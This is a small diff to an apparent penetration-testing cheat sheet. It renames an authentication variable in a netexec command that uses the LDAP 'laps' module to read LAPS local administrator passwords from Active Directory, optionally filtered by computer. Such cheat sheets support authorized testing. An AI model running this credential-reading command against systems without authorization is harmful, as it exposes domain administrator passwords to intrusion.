@@ -127,7 +127,7 @@ import passwords
 Read LAPS passwords using the netexec LAPS module with optional computer filter.
 
 ```sh title:"Read LAPS passwords via netexec laps module"
-nxc ldap "$rhost_ip" -d "$domain" -u "$user" $nxc_auth --module laps -O computer="$target_computer"
+nxc ldap "$rhost_ip" -d "$domain" -u "$user" $auth_flags --module laps -O computer="$target_computer"
 ```
 <!-- cheat
 import domain_ip
